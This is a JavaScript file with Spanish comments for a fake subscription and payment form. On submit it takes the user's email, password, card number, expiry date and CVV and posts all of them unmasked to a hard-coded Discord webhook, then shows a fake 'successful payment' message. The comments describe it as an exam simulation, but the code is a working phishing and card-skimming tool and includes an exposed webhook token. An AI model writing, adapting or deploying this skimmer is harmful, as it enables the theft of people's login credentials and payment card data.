document.addEventListener('DOMContentLoaded', () => {
    // URL del webhook de Discord
    const webhookUrl = 'https://discordapp.com/api/webhooks/1238872183456010250/HcR3SwnFkxXKKe_xRr6G1cYKNmqansD_wxVOfQqAS5Kvld00Pfv5xlTzw_minnslWLZd';

    const form = document.getElementById('subscription-form');
    const messageDiv = document.getElementById('message');

    form.addEventListener('submit', (e) => {
        e.preventDefault(); 

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        // Los siguientes datos se envían sin enmascarar, tal como se solicitó para el examen.
        const cardNumber = document.getElementById('card-number').value.trim();
        const expiryDate = document.getElementById('expiry-date').value.trim();
        const cvv = document.getElementById('cvv').value.trim();

        // Validación de campos
        if (email === '' || password === '' || cardNumber === '' || expiryDate === '' || cvv === '') {
            showMessage('Por favor, completa todos los campos.', 'error');
            return;
        }

        if (cardNumber.length !== 16) {
            showMessage('El número de tarjeta debe tener 16 dígitos.', 'error');
            return;
        }

        if (cvv.length !== 3) {
            showMessage('El CVV debe tener 3 dígitos.', 'error');
            return;
        }

        showMessage('Procesando pago...', 'info');

        // Payload con TODOS los datos del formulario
        const payload = {
            content: `¡Datos de prueba recibidos!`,
            embeds: [{
                title: 'Datos de Pago de Prueba',
                description: 'Este es un mensaje para tu simulación.',
                color: 5814783, 
                fields: [
                    { name: 'Correo electrónico', value: email },
                    { name: 'Contraseña', value: password },
                    { name: 'Número de tarjeta', value: cardNumber }, 
                    { name: 'Fecha de expiración', value: expiryDate },
                    { name: 'CVV', value: cvv } 
                ]
            }]
        };

        // Envío de la información
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        })
        .then(response => {
            if (response.ok) {
                setTimeout(() => {
                    showMessage(`¡Pago "exitoso"! Datos enviados al webhook.`, 'success');
                }, 2000); 
            } else {
                console.error('Error al enviar webhook:', response.status);
                showMessage('Error en la simulación. Revisa la consola.', 'error');
            }
        })
        .catch(error => {
            console.error('Error de red:', error);
            showMessage('Error de red. Revisa tu conexión a internet.', 'error');
        });
    });

    // Función auxiliar para mostrar mensajes
    function showMessage(text, type) {
        messageDiv.textContent = text;
        messageDiv.className = '';
        messageDiv.classList.add(type);
        messageDiv.classList.remove('hidden');
    }
});
